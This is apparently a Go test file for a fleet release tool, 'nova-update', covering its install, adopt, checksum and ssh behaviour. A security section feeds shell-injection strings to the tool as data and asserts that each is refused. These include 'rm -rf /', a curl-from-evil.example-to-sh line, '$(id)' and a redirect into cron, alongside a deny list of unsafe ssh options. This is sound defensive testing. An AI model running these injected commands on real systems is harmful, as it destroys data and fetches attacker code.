// endpoint for v0.15.2...dev -- 551 pull requests, well over the 64 KiB cap
// every other child here is held to. The capture cancelled the child, and what
// the verb printed was `signal: killed`: a refusal naming a symptom, with a
// remedy about the forge answering, for a cause that was entirely ours. The
// ceiling stays -- a runaway gh must not be able to fill memory -- but reaching
// it says so by name.
func TestAForgeReadThatFillsTheCeilingSaysSoRatherThanKilled(t *testing.T) {
	args := []string{"api", "repos/o/n/compare/v0.15.2...head"}
	err := apiError(args, true, fmt.Errorf("signal: killed"))
	if err == nil {
		t.Fatal("a capture that hit the ceiling was reported as success")
	}
	if strings.Contains(err.Error(), "killed") {
		t.Fatalf("the refusal still names the signal: %v", err)
	}
	for _, s := range []string{"ceiling", "nearer tag", "compare"} {
		if !strings.Contains(err.Error(), s) {
			t.Errorf("the refusal does not carry %q: %v", s, err)
		}
	}
	// An ordinary failure is still an ordinary failure, with gh's own words.
	err = apiError(args, false, fmt.Errorf("HTTP 404"))
	if err == nil || !strings.Contains(err.Error(), "404") {
		t.Fatalf("a real failure lost its cause: %v", err)
	}
	if err := apiError(args, false, nil); err != nil {
		t.Fatalf("a read that answered was reported as an error: %v", err)
	}
}

// ---------------------------------------------------------------------------
// the verb itself
// ---------------------------------------------------------------------------

func TestReleaseRefusesAnUnknownSubverbAndNamesTheFour(t *testing.T) {
	var o, e bytes.Buffer
	if code := Run("nova-update", []string{"ship"}, &o, &e, Deps{}); code != 2 {
		t.Fatal(code)
	}
	for _, verb := range []string{"cut", "build", "install", "adopt"} {
		if !strings.Contains(e.String(), verb) {
			t.Fatalf("the refusal does not name %s: %s", verb, e.String())
		}
	}
	o.Reset()
	e.Reset()
	if code := Run("nova-update", nil, &o, &e, Deps{}); code != 2 {
		t.Fatal(code)
	}
}

// Progress belongs on stderr and the result on stdout, so that a caller reading
// the receipt off stdout reads receipts and nothing else (Glenn 2026-09-17:
// programs say what they are doing).
func TestProgressGoesToStderrAndReceiptsToStdout(t *testing.T) {
	from := built(t, "v0.16.0", "", "nova-bus", "nova-update")
	s := &fakeSSH{answer: map[string]string{"hulk": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0\n"}}
	var o, e bytes.Buffer
	if code := Run("nova-update", []string{"adopt", "--version", "v0.16.0", "--machines", machinesFile(t, "hulk\n"),
		"--ssh", "/usr/bin/ssh", "--from", from, "--bin", "/b", "--dest", "/d"}, &o, &e, Deps{SSH: s}); code != 0 {
		t.Fatalf("%d %s", code, e.String())
	}
	if !strings.Contains(e.String(), "release: ") {
		t.Fatalf("no progress on stderr: %q", e.String())
	}
	for _, line := range strings.Split(strings.TrimSpace(o.String()), "\n") {
		if line != "" && !strings.HasPrefix(line, "RELEASE ") {
			t.Fatalf("stdout carries something that is not a receipt: %q", line)
		}
	}
}

// ---------------------------------------------------------------------------
// what the first fleet dogfood found (receipts, 2026-09-18, rowan-child)
// ---------------------------------------------------------------------------

// THE BLOCKER. adopt was written assuming it runs on the build host and fans
// out; on this fleet it cannot, because no bench has ssh trust to any other
// bench. 3 of 3 machines refused with `Permission denied (publickey)`. The fix
// that needs no new trust is to run adopt where the trust already is and let it
// READ the release from where it was built.
func TestAdoptFetchesTheReleaseFromAnotherMachine(t *testing.T) {
	goos, goarch := platformOf(t, "linux-amd64")
	// hulk built it; this host has never seen the artifacts.
	onHulk := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	stage := t.TempDir()
	served := ArtifactDir(onHulk, "v0.16.0", goos, goarch)
	// The digest the cut recorded, which reached this host through git.
	digest, err := fileSum(filepath.Join(served, SumsFile))
	if err != nil {
		t.Fatal(err)
	}
	s := &fakeSSH{
		serves: map[string]string{"hulk": served},
		answer: map[string]string{
			"vision": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n",
			"mini":   "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n",
		},
	}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
		"--machines", machinesFile(t, "vision\nmini\n"), "--ssh", "/usr/bin/ssh",
		"--from", "hulk:/home/nova/nova-bench/release", "--stage", stage,
		"--expect-sums", digest,
		"--bin", "~/.local/bin", "--dest", "~/nova-bench/build",
		"--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
	if code != 0 {
		t.Fatalf("code=%d errs=%s", code, e.String())
	}
	// ONE fetch, from the build host, and then a push to each machine: the
	// machines never talk to each other and never need to.
	if len(s.fetches) != 1 || !strings.Contains(s.fetches[0], "hulk: /home/nova/nova-bench/release/v0.16.0/linux-amd64") {
		t.Fatalf("fetches=%v", s.fetches)
	}
	if len(s.sends) != 2 || len(s.runs) != 2 {
		t.Fatalf("sends=%v runs=%v", s.sends, s.runs)
	}
	for _, machine := range []string{"vision", "mini"} {
		if !strings.Contains(o.String(), "RELEASE ADOPTED machine="+machine+" version=v0.16.0") {
			t.Fatalf("no receipt for %s:\n%s", machine, o.String())
		}
	}
	// The staged copy is a real copy, verified here before any of it moved on.
	if _, err := ReadSums(ArtifactDir(stage, "v0.16.0", goos, goarch)); err != nil {
		t.Fatalf("the release was not staged: %v", err)
	}
	// A leading ~ survives to the remote shell, which is what lets one --bin
	// name three different home directories.
	if !strings.Contains(s.runs[0], "--bin ~/.local/bin") {
		t.Fatalf("the tilde did not survive: %s", s.runs[0])
	}
}

func TestAdoptRefusesARemoteFromWithNoStage(t *testing.T) {
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
		"--machines", machinesFile(t, "vision\n"), "--ssh", "/usr/bin/ssh",
		"--from", "hulk:/releases", "--bin", "/b", "--dest", "/d"}, &o, &e, Deps{SSH: &fakeSSH{}})
	if code != 2 || !strings.Contains(e.String(), "--stage") {
		t.Fatalf("code=%d errs=%s", code, e.String())
	}
}

// A fetch that arrived truncated is caught ONCE, here, rather than four times
// on four machines that are then in four different states.
func TestAdoptRefusesAFetchThatDoesNotMatchItsChecksums(t *testing.T) {
	goos, goarch := platformOf(t, "linux-amd64")
	onHulk := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	dir := ArtifactDir(onHulk, "v0.16.0", goos, goarch)
	if err := os.WriteFile(filepath.Join(dir, "nova-bus"), []byte("truncated"), 0o755); err != nil {
		t.Fatal(err)
	}
	s := &fakeSSH{serves: map[string]string{"hulk": dir}}
	// The checksum FILE is untouched, so its digest still matches what the cut
	// recorded: this is the case where the bits alone were damaged in flight.
	digest, err := fileSum(filepath.Join(dir, SumsFile))
	if err != nil {
		t.Fatal(err)
	}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
		"--machines", machinesFile(t, "vision\n"), "--ssh", "/usr/bin/ssh",
		"--from", "hulk:/releases", "--stage", t.TempDir(), "--expect-sums", digest,
		"--bin", "/b", "--dest", "/d", "--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
	if code != 2 || !strings.Contains(e.String(), "nova-bus") {
		t.Fatalf("code=%d errs=%s", code, e.String())
	}
	if len(s.sends) != 0 {
		t.Fatalf("a bad fetch was still pushed to a machine: %v", s.sends)
	}
}

// A colon is ambiguous exactly once, and it is resolved in favour of the local
// path: a windows artifact root is a path, not a host called C.
func TestRemoteFromTellsAHostFromAWindowsPath(t *testing.T) {
	for _, tc := range []struct {
		in, host, dir string
		remote        bool
	}{
		{"hulk:/home/nova/release", "hulk", "/home/nova/release", true},
		{"nova@hulk:/releases", "nova@hulk", "/releases", true},
		{`C:\releases`, "", `C:\releases`, false},
		{"/home/nova/release", "", "/home/nova/release", false},
		{"hulk:", "", "hulk:", false},
	} {
		host, dir, remote := RemoteFrom(tc.in)
		if host != tc.host || dir != tc.dir || remote != tc.remote {
			t.Errorf("%q -> (%q, %q, %v), want (%q, %q, %v)", tc.in, host, dir, remote, tc.host, tc.dir, tc.remote)
		}
	}
}

// The fleet has three home directories. A machine that is the odd one out says
// so in the file, rather than in a second run with different flags -- which is
// a second chance to get the version wrong.
func TestMachinesFileCarriesPerMachineOverrides(t *testing.T) {
	machines, err := Machines(strings.NewReader(
		"# the fleet\nhulk\n\nvision\t~/bin\t~/stage\nnova@mini\t/opt/nova/bin\n"))
	if err != nil {
		t.Fatal(err)
	}
	want := []Machine{
		{Name: "hulk"},
		{Name: "vision", Bin: "~/bin", Dest: "~/stage"},
		{Name: "nova@mini", Bin: "/opt/nova/bin"},
	}
	if fmt.Sprint(machines) != fmt.Sprint(want) {
		t.Fatalf("got %v, want %v", machines, want)
	}
}

func TestMachinesFileRefusesAShapeItCannotMean(t *testing.T) {
	for _, tc := range []struct{ name, in, wants string }{
		{"an empty override", "vision\t\n", "empty"},
		{"a fourth column", "vision\t/b\t/d\t/x\n", "tab-separated fields"},
		{"a name with a semicolon", "hulk; rm -rf /\n", "machine name"},
		{"nothing at all", "# nobody\n\n", "no machine"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			_, err := Machines(strings.NewReader(tc.in))
			if err == nil || !strings.Contains(err.Error(), tc.wants) {
				t.Fatalf("got %v, want a refusal naming %q", err, tc.wants)
			}
		})
	}
}

func TestAdoptUsesEachMachinesOwnBinAndDest(t *testing.T) {
	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	list := machinesFile(t, "hulk\nvision\t/opt/nova/bin\t/opt/nova/stage\n")
	s := &fakeSSH{answer: map[string]string{
		"hulk":   "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n",
		"vision": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n",
	}}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0", "--machines", list,
		"--ssh", "/usr/bin/ssh", "--from", from, "--bin", "~/.local/bin",
		"--dest", "~/nova-bench/build", "--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
	if code != 0 {
		t.Fatalf("code=%d errs=%s", code, e.String())
	}
	if !strings.Contains(s.runs[0], "--bin ~/.local/bin") || !strings.Contains(s.runs[0], "~/nova-bench/build") {
		t.Fatalf("hulk did not get the flags' values: %s", s.runs[0])
	}
	if !strings.Contains(s.runs[1], "--bin /opt/nova/bin") || !strings.Contains(s.runs[1], "/opt/nova/stage") {
		t.Fatalf("vision did not get its own columns: %s", s.runs[1])
	}
	// And the receipt says where the tools actually went on that machine.
	if !strings.Contains(o.String(), "machine=vision version=v0.16.0 tools=2 skipped=0 retired=0 bin=/opt/nova/bin") {
		t.Fatalf("the receipt does not carry that machine's bin:\n%s", o.String())
	}
}

// After the first real adoption every bench held 18 stale ~/go/bin/nova-* from
// a `go install` months ago -- both directories on PATH, and which one wins a
// fact about PATH order nobody has read. The old shell script kept them in
// step; the verb did not.
func TestInstallRetiresStaleCopiesOfWhatItInstalled(t *testing.T) {
	from := built(t, "v0.16.0", "", "nova-bus", "nova-swarm")
	goos, _ := platformOf(t, "")
	bin, goBin := t.TempDir(), t.TempDir()
	// Two stale tools of ours, one tool of somebody else's, one directory.
	for _, name := range []string{ToolFile("nova-bus", goos), ToolFile("nova-swarm", goos), "gopls"} {
		if err := os.WriteFile(filepath.Join(goBin, name), []byte("stale"), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.MkdirAll(filepath.Join(goBin, "nova-keep-me"), 0o755); err != nil {
		t.Fatal(err)
	}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"install", "--from", from, "--version", "v0.16.0",
		"--bin", bin, "--retire", goBin}, &o, &e,
		Deps{VersionOf: func(context.Context, string) (string, error) { return "", fmt.Errorf("absent") }})
	if code != 0 {
		t.Fatalf("code=%d errs=%s", code, e.String())
	}
	if !strings.Contains(o.String(), "tools=2 skipped=0 retired=2") {
		t.Fatalf("the receipt does not count the retirement:\n%s", o.String())
	}
	for _, name := range []string{ToolFile("nova-bus", goos), ToolFile("nova-swarm", goos)} {
		if _, err := os.Stat(filepath.Join(goBin, name)); !os.IsNotExist(err) {
			t.Fatalf("%s was not retired: %v", name, err)
		}
	}
	// NARROW: only a name this run installed, only a regular file. Somebody
	// else's tool and a directory that happens to be called nova-* stay.
	if _, err := os.Stat(filepath.Join(goBin, "gopls")); err != nil {
		t.Fatalf("a tool that is not ours was removed: %v", err)
	}
	if _, err := os.Stat(filepath.Join(goBin, "nova-keep-me")); err != nil {
		t.Fatalf("a directory was removed: %v", err)
	}
	// And what was installed is untouched.
	assertRunnable(t, filepath.Join(bin, ToolFile("nova-bus", goos)))
}

// The one argument that would delete the release just installed.
func TestInstallRefusesToRetireTheDirectoryItInstalledInto(t *testing.T) {
	from := built(t, "v0.16.0", "", "nova-bus")
	bin := t.TempDir()
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"install", "--from", from, "--version", "v0.16.0",
		"--bin", bin, "--retire", bin}, &o, &e,
		Deps{VersionOf: func(context.Context, string) (string, error) { return "", fmt.Errorf("absent") }})
	if code != 2 || !strings.Contains(e.String(), "--retire") {
		t.Fatalf("code=%d errs=%s", code, e.String())
	}
	goos, _ := platformOf(t, "")
	assertRunnable(t, filepath.Join(bin, ToolFile("nova-bus", goos)))
}

func TestInstallWithNoRetireDirectoryIsNotAFailure(t *testing.T) {
	from := built(t, "v0.16.0", "", "nova-bus")
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"install", "--from", from, "--version", "v0.16.0",
		"--bin", t.TempDir(), "--retire", filepath.Join(t.TempDir(), "no-go-bin-here")}, &o, &e,
		Deps{VersionOf: func(context.Context, string) (string, error) { return "", fmt.Errorf("absent") }})
	if code != 0 || !strings.Contains(o.String(), "retired=0") {
		t.Fatalf("code=%d out=%s errs=%s", code, o.String(), e.String())
	}
}

func TestAdoptPassesRetireToEachMachineAndCountsIt(t *testing.T) {
	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	s := &fakeSSH{answer: map[string]string{
		"hulk": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=18\n",
	}}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
		"--machines", machinesFile(t, "hulk\n"), "--ssh", "/usr/bin/ssh", "--from", from,
		"--bin", "~/.local/bin", "--dest", "~/build", "--retire", "~/go/bin",
		"--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
	if code != 0 {
		t.Fatalf("code=%d errs=%s", code, e.String())
	}
	if !strings.Contains(s.runs[0], "--retire ~/go/bin") {
		t.Fatalf("the remote install was not told to retire: %s", s.runs[0])
	}
	if !strings.Contains(o.String(), "retired=18") {
		t.Fatalf("the receipt does not carry the retirement:\n%s", o.String())
	}
}

// The help is the banner, and these are the two things a person cannot work out
// from the flag names alone.
func TestReleaseHelpCarriesTheMachinesFormatAndTheAdoptRule(t *testing.T) {
	var o, e bytes.Buffer
	if code := Run("nova-update", []string{"help"}, &o, &e, Deps{}); code != 0 {
		t.Fatal(code)
	}
	for _, s := range []string{"one machine per line", "TAB", "user@host", "expands a leading ~", "host:dir", "--retire"} {
		if !strings.Contains(o.String(), s) {
			t.Errorf("the help does not carry %q:\n%s", s, o.String())
		}
	}
}

// ---------------------------------------------------------------------------
// Johnny's security read of adopt (2026-09-18). One test per "never".
// ---------------------------------------------------------------------------

// NEVER interpolate an unvalidated host or path into a command the far side's
// shell will parse. adopt composes `mkdir -p <dest> && tar -C <dest> -xf -`,
// so a path carrying shell syntax would not be a path, it would be a command.
// Every one of these is refused BEFORE any remote command is composed, which is
// why the assertion is that ssh was never reached at all.
func TestAdoptRefusesAPathTheRemoteShellWouldReadAsSyntax(t *testing.T) {
	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	hostile := []string{
		"/tmp/x; rm -rf /",
		"/tmp/x && curl evil.example/k | sh",
		"/tmp/$(id)",
		"/tmp/`id`",
		"/tmp/x|tee /etc/passwd",
		"/tmp/x\nrm -rf /",
		"/tmp/'x'",
		"/tmp/x>/etc/cron.d/x",
		"relative/path",
		"~/../../etc",
		"$HOME/bin",
	}
	for _, flag := range []string{"--bin", "--dest", "--retire"} {
		for _, bad := range hostile {
			t.Run(flag+" "+bad, func(t *testing.T) {
				args := []string{"adopt", "--version", "v0.16.0",
					"--machines", machinesFile(t, "hulk\n"), "--ssh", "/usr/bin/ssh",
					"--from", from, "--bin", "~/.local/bin", "--dest", "~/build",
					"--platform", "linux-amd64"}
				// Replace the flag under test with the hostile value.
				for i := range args {
					if args[i] == flag {
						args[i+1] = bad
					}
				}
				if flag == "--retire" {
					args = append(args, "--retire", bad)
				}
				s := &fakeSSH{answer: map[string]string{"hulk": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n"}}
				var o, e bytes.Buffer
				code := Run("nova-update", args, &o, &e, Deps{SSH: s})
				if code != 2 {
					t.Fatalf("%s %q was accepted: code=%d out=%s", flag, bad, code, o.String())
				}
				if len(s.runs)+len(s.sends)+len(s.fetches) != 0 {
					t.Fatalf("%s %q reached ssh: runs=%v sends=%v", flag, bad, s.runs, s.sends)
				}
			})
		}
	}
}

// The same rule for a path that arrives in the machines file rather than on the
// command line: the columns are interpolated into the same remote command.
func TestAdoptRefusesAHostilePathInTheMachinesFile(t *testing.T) {
	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	s := &fakeSSH{}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
		"--machines", machinesFile(t, "hulk\nvision\t/opt/x; rm -rf /\n"), "--ssh", "/usr/bin/ssh",
		"--from", from, "--bin", "~/.local/bin", "--dest", "~/build",
		"--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
	if code != 2 || !strings.Contains(e.String(), "vision") {
		t.Fatalf("code=%d errs=%s", code, e.String())
	}
	// Not even the FIRST machine was touched: the whole file is validated
	// before any of it is acted on, so a bad line does not leave half a fleet
	// adopted and half refused.
	if len(s.runs)+len(s.sends) != 0 {
		t.Fatalf("a hostile column still reached ssh: %v %v", s.runs, s.sends)
	}
}

func TestValidRemotePathTakesWhatItShould(t *testing.T) {
	for _, good := range []string{"/home/nova/.local/bin", "~/.local/bin", "/opt/nova-tools/bin", "~/go/bin", "/a+b/c-d_e.f@g"} {
		if err := ValidRemotePath("--bin", good); err != nil {
			t.Errorf("refused %q: %v", good, err)
		}
	}
}

// NEVER forward the agent, and never put a key on argv. This verb runs on the
// one host that holds keys to the whole fleet; forwarding that agent to a bench
// would put the fleet's trust inside a machine the release is being pushed TO,
// and a key named on argv is a key in every `ps` on the box.
func TestSSHOptionsForbidAgentForwardingAndKeysOnArgv(t *testing.T) {
	joined := strings.Join(SSHOptions, " ")
	if !strings.Contains(joined, "ForwardAgent=no") {
		t.Fatalf("ForwardAgent=no is not said out loud: %s", joined)
	}
	if !strings.Contains(joined, "BatchMode=yes") {
		t.Fatalf("BatchMode=yes is missing: %s", joined)
	}
	for _, never := range []string{"ForwardAgent=yes", "-i ", "IdentityFile", "-A", "StrictHostKeyChecking=no", "Password"} {
		if strings.Contains(joined, never) {
			t.Fatalf("the ssh options carry %q: %s", never, joined)
		}
	}
	// And the whole composed argv for a real machine carries none of them.
	argv := ExecSSH{Path: "/usr/bin/ssh"}.sshArgs("hulk")
	if argv[len(argv)-1] != "hulk" {
		t.Fatalf("the machine is not the last argument: %v", argv)
	}
	for _, a := range argv {
		if a == "-i" || a == "-A" || strings.HasSuffix(a, ".key") || strings.HasSuffix(a, ".pem") {
			t.Fatalf("a key or an agent flag reached argv: %v", argv)
		}
	}
}

// NEVER let a release fetched from a machine be verified by the checksum file
// that came with it: anybody who could change one could change the other. The
// digest comes from the cut, through git, and a mismatch names BOTH -- which
// one is wrong is the whole question.
func TestAdoptRefusesAFetchedReleaseWhoseSumsAreNotTheOnesCut(t *testing.T) {
	goos, goarch := platformOf(t, "linux-amd64")
	onHulk := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	dir := ArtifactDir(onHulk, "v0.16.0", goos, goarch)
	s := &fakeSSH{serves: map[string]string{"hulk": dir}}
	// A digest of something else entirely: what the cut recorded.
	cutDigest := strings.Repeat("ab", 32)
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
		"--machines", machinesFile(t, "vision\n"), "--ssh", "/usr/bin/ssh",
		"--from", "hulk:/releases", "--stage", t.TempDir(), "--expect-sums", cutDigest,
		"--bin", "~/.local/bin", "--dest", "~/build", "--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
	if code != 2 {
		t.Fatalf("a substituted release was adopted: code=%d out=%s", code, o.String())
	}
	if !strings.Contains(e.String(), cutDigest) {
		t.Fatalf("the refusal does not name the digest the release was cut with: %s", e.String())
	}
	if !strings.Contains(e.String(), "was cut with") || strings.Count(e.String(), "digest") < 2 {
		t.Fatalf("the refusal does not name both digests: %s", e.String())
	}
	if len(s.sends) != 0 {
		t.Fatalf("a release that failed the digest was still pushed: %v", s.sends)
	}
}

func TestAdoptRefusesARemoteFromWithNoDigestToCheckAgainst(t *testing.T) {
	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	s := &fakeSSH{serves: map[string]string{"hulk": ArtifactDir(from, "v0.16.0", "linux", "amd64")}}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
		"--machines", machinesFile(t, "vision\n"), "--ssh", "/usr/bin/ssh",
		"--from", "hulk:/releases", "--stage", t.TempDir(),
		"--bin", "~/.local/bin", "--dest", "~/build", "--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
	if code != 2 || !strings.Contains(e.String(), "--expect-sums") {
		t.Fatalf("code=%d errs=%s", code, e.String())
	}
	if len(s.fetches) != 0 {
		t.Fatalf("a release was fetched with nothing to check it against: %v", s.fetches)
	}
}

// The digest the cut records and the digest adopt checks are the same string,
// written in the form the flag wants so nobody has to transcribe it.
func TestCutRecordsTheSumsDigestTheAdoptWillCheck(t *testing.T) {
	goos, goarch := platformOf(t, "linux-amd64")
	out := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	sums := filepath.Join(ArtifactDir(out, "v0.16.0", goos, goarch), SumsFile)
	want, err := fileSum(sums)
	if err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(t.TempDir(), "CHANGELOG.md")
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"cut", "--repo", "o/n", "--from", "main",
		"--version", "v0.16.0", "--changelog", path, "--sums", sums}, &o, &e, cutDeps(t, cutForge()))
	if code != 0 {
		t.Fatalf("code=%d errs=%s", code, e.String())
	}
	body, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(body), SumsDigestPrefix+want) {
		t.Fatalf("the section does not record the digest %s:\n%s", want, body)
	}
	if !strings.Contains(string(body), "--expect-sums "+want) {
		t.Fatalf("the section does not say how to use it:\n%s", body)
	}
	if !strings.Contains(o.String(), "sums="+want) {
		t.Fatalf("the cut line does not carry the digest: %s", o.String())
	}
	// And that digest is exactly what adopt accepts for the same artifacts.
	s := &fakeSSH{
		serves: map[string]string{"hulk": ArtifactDir(out, "v0.16.0", goos, goarch)},
		answer: map[string]string{"vision": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n"},
	}
	o.Reset()
	e.Reset()
	if code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
		"--machines", machinesFile(t, "vision\n"), "--ssh", "/usr/bin/ssh",
		"--from", "hulk:/releases", "--stage", t.TempDir(), "--expect-sums", want,
		"--bin", "~/.local/bin", "--dest", "~/build", "--platform", "linux-amd64"},
		&o, &e, Deps{SSH: s}); code != 0 {
		t.Fatalf("the digest the cut wrote was not accepted: %d %s", code, e.String())
	}
}

// NEVER install before the checksum. The order is asserted by watching what the
// verb touched: a release whose bytes changed reaches neither the version probe
// nor a rename.
func TestInstallChecksBeforeItTouchesAnything(t *testing.T) {
	from := built(t, "v0.16.0", "", "nova-bus", "nova-swarm")
	goos, _ := platformOf(t, "")
	dir := ArtifactDir(from, "v0.16.0", goos, "")
	dir = filepath.Dir(dir)
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	platDir := filepath.Join(dir, entries[0].Name())
	if err := os.WriteFile(filepath.Join(platDir, ToolFile("nova-bus", goos)), []byte("swapped"), 0o755); err != nil {
		t.Fatal(err)
	}
	bin := t.TempDir()
	probed := 0
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"install", "--from", from, "--version", "v0.16.0", "--bin", bin},
		&o, &e, Deps{VersionOf: func(context.Context, string) (string, error) {
			probed++
			return "", fmt.Errorf("absent")
		}})
	if code != 2 {
		t.Fatalf("code=%d", code)
	}
	if probed != 0 {
		t.Fatalf("the version probe ran %d times before the checksum was checked", probed)
	}
	if entries, err := os.ReadDir(bin); err != nil || len(entries) != 0 {
		t.Fatalf("something was written before the checksum passed: %v %v", entries, err)
	}
}

// NEVER remove the last-good stamp. --from's artifact directory is what a
// re-install and a rollback read, and what adopt just verified.
func TestRetireRefusesTheLiveStamp(t *testing.T) {
	from := built(t, "v0.16.0", "", "nova-bus")
	goos, goarch := platformOf(t, "")
	for _, target := range []string{from, ArtifactDir(from, "v0.16.0", goos, goarch)} {
		var o, e bytes.Buffer
		code := Run("nova-update", []string{"install", "--from", from, "--version", "v0.16.0",
			"--bin", t.TempDir(), "--retire", target}, &o, &e,
			Deps{VersionOf: func(context.Context, string) (string, error) { return "", fmt.Errorf("absent") }})
		if code != 2 || !strings.Contains(e.String(), "stamp") {
			t.Fatalf("--retire %s: code=%d errs=%s", target, code, e.String())
		}
		// The stamp is still whole: a refused retire removed nothing.
		if _, err := ReadSums(ArtifactDir(from, "v0.16.0", goos, goarch)); err != nil {
			t.Fatalf("the stamp was damaged by a refused retire: %v", err)
		}
	}
}

// NEVER copy whatever happens to be in the directory. The shipped set is the
// verified set: a key or a token dropped beside the binaries must not be
// couriered to every machine in the fleet by a verb nobody thinks of as a file
// transfer.
func TestSendCarriesOnlyWhatTheChecksumFileNames(t *testing.T) {
	goos, goarch := platformOf(t, "")
	from := built(t, "v0.16.0", "", "nova-bus", "nova-update")
	dir := ArtifactDir(from, "v0.16.0", goos, goarch)
	for _, stray := range []string{"deploy.key", "notes.txt", ".env"} {
		if err := os.WriteFile(filepath.Join(dir, stray), []byte("secret"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	var buf bytes.Buffer
	arts, err := ReadSums(dir)
	if err != nil {
		t.Fatal(err)
	}
	allowed := map[string]bool{SumsFile: true}
	for _, a := range arts {
		allowed[a.Name] = true
	}
	if err := writeTar(&buf, dir, "linux-amd64", allowed); err != nil {
		t.Fatal(err)
	}
	sent := map[string]bool{}
	tr := tar.NewReader(&buf)
	for {
		h, err := tr.Next()
		if err != nil {
			break
		}
		sent[filepath.Base(h.Name)] = true
	}
	for _, stray := range []string{"deploy.key", "notes.txt", ".env"} {
		if sent[stray] {
			t.Fatalf("%s was sent to the machine; the tar carried %v", stray, sent)
		}
	}
	for _, a := range arts {
		if !sent[a.Name] {
			t.Fatalf("%s was not sent; the tar carried %v", a.Name, sent)
		}
	}
	if !sent[SumsFile] {
		t.Fatalf("the checksum file was not sent: %v", sent)
	}
}

// NEVER eval what the far side said. The receipt is matched by a regexp and
// nothing else, so a remote answering with shell syntax is a machine that gets
// refused, not a command that runs here.
func TestAdoptTreatsRemoteOutputAsDataNotAsACommand(t *testing.T) {
	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	marker := filepath.Join(t.TempDir(), "should-not-exist")
	s := &fakeSSH{answer: map[string]string{
		"hulk": "$(touch " + marker + ")\n`touch " + marker + "`\n; touch " + marker + "\n",
	}}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
		"--machines", machinesFile(t, "hulk\n"), "--ssh", "/usr/bin/ssh", "--from", from,
		"--bin", "~/.local/bin", "--dest", "~/build", "--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
	if code != 1 || !strings.Contains(e.String(), "RELEASE REFUSED machine=hulk") {
		t.Fatalf("code=%d errs=%s", code, e.String())
	}
	if _, err := os.Stat(marker); !os.IsNotExist(err) {
		t.Fatalf("the remote's output was executed: %v", err)
	}
}

// The far-side binary is named by ABSOLUTE path, never by $PATH: it must be the
// one just sent and verified, not whichever nova-update the bench's PATH finds.
func TestAdoptRunsTheBinaryItSentByAbsolutePath(t *testing.T) {
	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	s := &fakeSSH{answer: map[string]string{"hulk": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n"}}
	var o, e bytes.Buffer
	if code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
		"--machines", machinesFile(t, "hulk\n"), "--ssh", "/usr/bin/ssh", "--from", from,
		"--bin", "~/.local/bin", "--dest", "~/nova-bench/build", "--platform", "linux-amd64"},
		&o, &e, Deps{SSH: s}); code != 0 {
		t.Fatalf("code=%d errs=%s", code, e.String())
	}
	run := s.runs[0]
	command := strings.TrimPrefix(run, "hulk: ")
	first := strings.Fields(command)[0]
	if first != "~/nova-bench/build/v0.16.0/linux-amd64/nova-update" {
		t.Fatalf("the remote command does not name the sent binary by path: %q", first)
	}
	if !strings.HasPrefix(first, "/") && !strings.HasPrefix(first, "~/") {
		t.Fatalf("the remote binary would resolve against $PATH: %q", first)
	}
}
